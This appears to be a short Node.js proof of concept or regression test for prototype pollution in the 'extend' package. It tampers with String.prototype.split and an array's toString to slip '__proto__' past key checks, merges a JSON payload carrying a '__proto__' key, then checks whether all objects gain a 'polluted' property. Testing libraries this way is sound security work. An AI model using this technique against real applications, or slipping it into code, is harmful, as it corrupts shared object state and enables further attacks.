var arg = ['__proto__'];
var flag1 = true;
arg.toString = function () {
    if (flag1) {
        flag1 = false;
        return 'foo';
    } else {
        return '__proto__';
    }
};
String.prototype.split = function () {
    return [
        arg,
        'polluted'
    ];
};
let extend = require('extend');
let payload = JSON.parse('{"__proto__": {"polluted": "yes"}}');
var obj = {};
console.log({}.polluted);
extend(true, {}, payload);
console.log({}.polluted);